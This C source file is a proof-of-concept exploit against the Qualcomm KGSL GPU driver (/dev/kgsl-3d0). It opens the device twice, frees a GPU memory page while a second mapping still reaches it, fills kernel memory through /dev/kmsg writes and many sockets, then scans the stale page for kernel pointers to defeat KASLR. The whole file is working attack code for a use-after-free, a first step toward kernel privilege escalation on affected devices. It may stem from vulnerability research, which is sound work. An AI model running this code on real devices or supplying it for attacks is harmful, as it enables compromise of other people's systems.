#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

void trigger_kernel_allocs() {
    // Generate lots of kernel allocation to reclaim the freed physical page
    // 1. Dmesg strings (printk)
    int fd = open("/dev/kmsg", O_WRONLY);
    if (fd >= 0) {
        for (int i = 0; i < 1000; i++) {
            write(fd, "KASLR_LEAK_TEST_MSG\n", 20);
        }
        close(fd);
    }
    
    // 2. Open many files / sockets
    for (int i = 0; i < 1000; i++) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) break;
        // create dummy route cache
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(80);
        inet_pton(AF_INET, "8.8.8.8", &target.sin_addr);
        connect(s, (struct sockaddr*)&target, sizeof(target));
        // Keep them open to consume memory
    }
}

int main() {
    printf("[*] Starting GPU Physical Page UAF / KASLR Leak test...\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0) {
        perror("[-] Failed to open fd1");
        return 1;
    }

    struct gpumem_alloc_req req = {0};
    req.size = 0x1000; // 4KB page

    if (ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req) < 0) {
        perror("[-] fd1 alloc failed");
        return 1;
    }
    printf("[+] Allocated GPU memory at offset: 0x%lx\n", req.gpuaddr);

    // mapped via fd2
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0) {
        perror("[-] Failed to open fd2");
        return 1;
    }

    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, req.gpuaddr);
    if (ptr2 == MAP_FAILED) {
        perror("[-] fd2 mmap failed");
        return 1;
    }

    printf("[+] fd2 mmap successful! Buffer at %p\n", ptr2);

    // Write magic
    ptr2[0] = 0x1122334455667788ULL;
    ptr2[1] = 0xAABBCCDDEEFF0011ULL;
    printf("[*] Wrote magic markers. Reading back: 0x%lx 0x%lx\n", ptr2[0], ptr2[1]);

    // FREE the page!
    printf("[*] Closing fd1 to trigger GPU object release -> Buddy Allocator...\n");
    close(fd1);

    // Wait a bit
    sleep(1);
    
    printf("[*] Reading back from UAF mapping: 0x%lx 0x%lx\n", ptr2[0], ptr2[1]);

    printf("[*] Spraying kernel allocations to hijack the freed physical page...\n");
    trigger_kernel_allocs();

    printf("[*] Scan UAF page for KASLR pointers...\n");
    int found_leak = 0;
    for (int i = 0; i < 512; i++) {
        uint64_t val = ptr2[i];
        if (val != 0 && val != 0x1122334455667788ULL && val != 0xAABBCCDDEEFF0011ULL) {
            printf("    [!!!] Offset %04x: 0x%016lx\n", i * 8, val);
            if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL || (val & 0xffffffc000000000ULL) == 0xffffffc000000000ULL) {
                printf("    [KASLR LEAK?] Found kernel pointer!\n");
                found_leak = 1;
            }
        }
    }

    if (!found_leak) {
        printf("[-] No kernel pointers found. Either the page wasn't freed, or we didn't hit it.\n");
    } else {
        printf("[+] SUCCESS! Physical Page UAF confirmed!\n");
    }

    return 0;
}